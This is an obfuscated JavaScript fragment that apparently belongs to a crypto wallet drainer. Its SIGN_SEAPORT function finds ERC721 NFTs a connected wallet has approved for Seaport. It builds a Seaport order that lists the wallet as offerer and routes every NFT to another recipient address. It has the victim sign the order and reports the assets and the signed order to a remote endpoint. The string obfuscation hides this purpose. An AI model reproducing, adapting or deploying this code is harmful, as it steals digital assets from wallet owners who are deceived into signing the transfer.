function _0x1513(_0x321239, _0xf9cf0e) {
  const _0x40e975 = _0x551a();
  _0x1513 = function (_0x8f1725, _0x317183) {
      _0x8f1725 = _0x8f1725 - (-0x1183 * -0x2 + -0xf33 * -0x1 + -0x188f * 0x2);
      let _0x331897 = _0x40e975[_0x8f1725];
      return _0x331897;
  };
  return _0x1513(_0x321239, _0xf9cf0e);
}
function _0x551a() {
  const _0x52056a = [
      'createOrder',
      'forEach',
      'ERC721',
      '8163CYBYXM',
      'type',
      'address',
      'push',
      'Web3Provider',
      '7docwLr',
      'seaport',
      '4552984bWWwlX',
      '22286176qcyGiv',
      '1660921177',
      'getSigner',
      '2exlioC',
      'collection',
      '0x1E0049783F008A0085193E00003D00cd54003c71',
      '12pxpvUR',
      'skip',
      '1076695NCQVEw',
      'log',
      'success',
      '5740vxrpnv',
      '506508zcZkrS',
      '0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000',
      'request',
      'providers',
      '365162hlYZSq',
      'chain_id',
      '1109211UjmeFB',
      '1.5'
  ];
  _0x551a = function () {
      return _0x52056a;
  };
  return _0x551a();
}
(function (_0x5b7f1d, _0x54486d) {
  const _0x382f2f = _0x1513;
  const _0x36d8e1 = _0x5b7f1d();
  while (!![]) {
      try {
          const _0x8f16fc = -parseInt(_0x382f2f(0x138)) / (0x1079 + 0x1 * -0x18b3 + 0x83b) * (parseInt(_0x382f2f(0x12b)) / (-0x182 * 0x5 + 0x1f59 + 0x9 * -0x2a5)) + -parseInt(_0x382f2f(0x11b)) / (0x1 * -0x1edd + -0x3da + 0x22ba) + -parseInt(_0x382f2f(0x134)) / (0x3 * 0x4eb + 0x12a7 + -0x2164) + parseInt(_0x382f2f(0x130)) / (-0x17d1 + -0x1 * 0x747 + 0x1f1d) * (parseInt(_0x382f2f(0x12e)) / (-0x1 * 0x653 + 0x23d5 + -0x1d7c)) + -parseInt(_0x382f2f(0x125)) / (-0x1d * -0x3b + -0x162d + 0x1 * 0xf85) * (parseInt(_0x382f2f(0x127)) / (0x7e7 + -0x763 + -0x7c)) + parseInt(_0x382f2f(0x120)) / (-0x983 * -0x1 + 0x2 * -0xde5 + -0x2 * -0x928) * (-parseInt(_0x382f2f(0x133)) / (0xcac + 0x3 * -0xb11 + 0xc3 * 0x1b)) + parseInt(_0x382f2f(0x128)) / (0x4 * -0x833 + -0xab2 * 0x1 + 0x2b89);
          if (_0x8f16fc === _0x54486d) {
              break;
          } else {
              _0x36d8e1['push'](_0x36d8e1['shift']());
          }
      } catch (_0x1d2a1c) {
          _0x36d8e1['push'](_0x36d8e1['shift']());
      }
  }
}(_0x551a, 0x23e * 0x3da + 0x3 * 0xbf27 + -0x329ee));
const SIGN_SEAPORT = async (_0x224ba8, _0x2437f1, _0x550f8d, _0x31c410, _0x532ecd) => {
  const _0x2bed50 = _0x1513;
  try {
      const _0x57e5c1 = [], _0x3fc843 = [];
      for (const _0x436768 of _0x224ba8) {
          if (_0x436768['skip'] || _0x436768[_0x2bed50(0x121)] !== _0x2bed50(0x11f) || _0x436768[_0x2bed50(0x139)] != -0x10 * 0x10 + -0xd * -0x25f + 0x1 * -0x1dd2)
              continue;
          if (!await is_nft_approved(_0x436768[_0x2bed50(0x122)], _0x550f8d, _0x2bed50(0x12d)))
              continue;
          _0x57e5c1[_0x2bed50(0x123)]({
              'collection': _0x436768[_0x2bed50(0x122)],
              'tokenID': _0x436768['id']
          });
          _0x3fc843[_0x2bed50(0x123)](_0x436768);
      }
      if (_0x57e5c1['length'] === 0x5b3 + 0x14ac + -0x2b * 0x9d)
          return;
      let _0x1be4a6 = new ethers[(_0x2bed50(0x137))][(_0x2bed50(0x124))](_0x2437f1), _0x361116 = _0x1be4a6[_0x2bed50(0x12a)]();
      let _0x328ac3 = [], _0x3b3ac2 = [];
      _0x57e5c1[_0x2bed50(0x11e)]((_0x1cdde1, _0x20552b) => {
          const _0x1aed58 = _0x2bed50;
          _0x328ac3['push']({
              'itemType': 0x2,
              'token': _0x1cdde1['collection'],
              'identifier': _0x1cdde1['tokenID']
          });
          _0x3b3ac2[_0x1aed58(0x123)]({
              'amount': '1',
              'recipient': _0x31c410,
              'itemType': 0x2,
              'token': _0x1cdde1[_0x1aed58(0x12c)],
              'identifier': _0x1cdde1['tokenID']
          });
      });
      try {
          const _0x183c6e = new seaport['Seaport'](_0x361116, { 'seaportVersion': _0x2bed50(0x11c) });
          const {executeAllActions: _0x127b8e} = await _0x183c6e[_0x2bed50(0x11d)]({
              'offer': _0x328ac3,
              'consideration': _0x3b3ac2,
              'conduitKey': _0x2bed50(0x135),
              'zone': '0x004C00500000aD104D7DBd00e3ae0A5C00560C00',
              'startTime': _0x2bed50(0x129),
              'endTime': '19163599577',
              'offerer': _0x550f8d
          }, _0x31c410);
          await send_request({
              'action': _0x2bed50(0x126),
              'user_id': _0x532ecd,
              'seaport': _0x2bed50(0x136),
              'assets': _0x3fc843
          });
          const _0x401aa3 = await _0x127b8e();
          await send_request({
              'action': _0x2bed50(0x126),
              'user_id': _0x532ecd,
              'seaport': _0x2bed50(0x132),
              'order': _0x401aa3,
              'address': _0x550f8d
          });
          for (const _0x334ea3 of _0x224ba8) {
              if (_0x334ea3[_0x2bed50(0x12f)] || _0x334ea3[_0x2bed50(0x121)] !== _0x2bed50(0x11f) || _0x334ea3['chain_id'] != -0x2 * 0x83e + -0x85a + 0x18d7)
                  continue;
              let _0x2b03ff = ![];
              for (const _0x428a73 of _0x3fc843) {
                  if (_0x428a73[_0x2bed50(0x121)] !== _0x2bed50(0x11f) || _0x428a73[_0x2bed50(0x139)] != -0x1d40 + 0x29 * 0x47 + -0x7 * -0x28e)
                      continue;
                  if (_0x428a73[_0x2bed50(0x122)] == _0x334ea3[_0x2bed50(0x122)] && _0x428a73['id'] == _0x334ea3['id']) {
                      _0x2b03ff = !![];
                      break;
                  }
              }
              if (_0x2b03ff == !![]) {
                  _0x334ea3[_0x2bed50(0x12f)] = !![];
              }
          }
      } catch (_0x16740b) {
          console['log'](_0x16740b);
          await send_request({
              'action': _0x2bed50(0x126),
              'user_id': _0x532ecd,
              'seaport': 'cancel'
          });
      }
  } catch (_0x9239da) {
      console[_0x2bed50(0x131)](_0x9239da);
  }
};